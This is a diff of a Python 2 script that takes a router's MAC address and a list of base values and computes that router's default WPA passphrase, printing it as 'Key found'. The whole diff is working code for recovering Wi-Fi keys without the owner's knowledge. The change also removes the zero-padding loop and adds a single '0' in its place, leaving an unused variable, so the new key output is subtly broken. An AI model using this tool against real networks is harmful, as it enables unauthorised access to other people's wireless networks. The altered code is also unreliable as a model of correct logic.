@@ -26,50 +26,45 @@ def stampa():
 	print ""
 
 if(len(sys.argv)>2):
-	mac_addr=sys.argv[1] 	#mac 
-	fin=sys.argv[2]	#bases.lst	
-	wmac=mac_addr[:8] 
-	mac6=mac_addr[9:17]
+	mac_addr=sys.argv[1] 	
+	fin=sys.argv[2]		
+	inputmacf6=mac_addr[0:8] 
+	inputmacl6=mac_addr[9:17] 
 	try:
-		for riga in fileinput.input(fin):
-			da=riga[9:17]
-			a=riga[18:26]
-			if((riga[:8]==wmac) and (da<mac6<a)):	
-				sn1=riga[27:33]
-				base=riga[34:40]
-				inc=riga[41]
+		for line in fileinput.input(fin):
+			filemacf6=line[0:8]			
+			filemacfl6=line[9:17]
+			filemacll6=line[18:26]
+			sn1=line[27:33]
+			base=line[34:40]
+			inc=line[41]
+			testimacl6=mac_addr[9:17]
+			if(filemacf6==inputmacf6 and filemacfl6<=inputmacl6<=filemacll6):	
 				esito=bool(1)
-				break
-			else:
-				esito=bool(0)
+				testimacl6=testimacl6.replace(':','')
+				sn1=sn1.replace(' ','')  
+				testimacl6=int(testimacl6,16)
+				base=int(base,16)
+				inc=int(inc)
+				ris=testimacl6-base
+				ris=ris/inc
+				ris=str(ris)
+				cc=len(ris)	
+				zeros=(7-cc)
+				ris="0"+ris
+				print "*********************************"
+				print "* Key found:			*"
+				print "* MAC =",mac_addr,"	*"
+				print "* WPA =",sn1+""+ris,"		*"
+				print "*				*"
+				print "*********************************"
+			
 	except IOError:
 		print "No such file"
 		sys.exit()	
 	if(not(esito)):	
 		print "Mac is not on the list"
 		sys.exit()
-	mac6=mac6.replace(':','')
-	sn1=sn1.replace(' ','')  
-	mac6=int(mac6,16)
-	base=int(base,16)
-	inc=int(inc)
-	ris=mac6-base
-	ris=ris/inc
-	ris=str(ris)
-	
-	cc=len(ris)	
-	zeros=(7-cc)
 
-	i=0
-	while (i<zeros): 
-		ris="0"+ris
-		i=i+1
-			
-	print "*********************************"
-	print "* Key found:			*"
-	print "* MAC =",mac_addr,"	*"
-	print "* WPA =",sn1+""+ris,"		*"
-	print "*				*"
-	print "*********************************"
 else:
 	stampa()
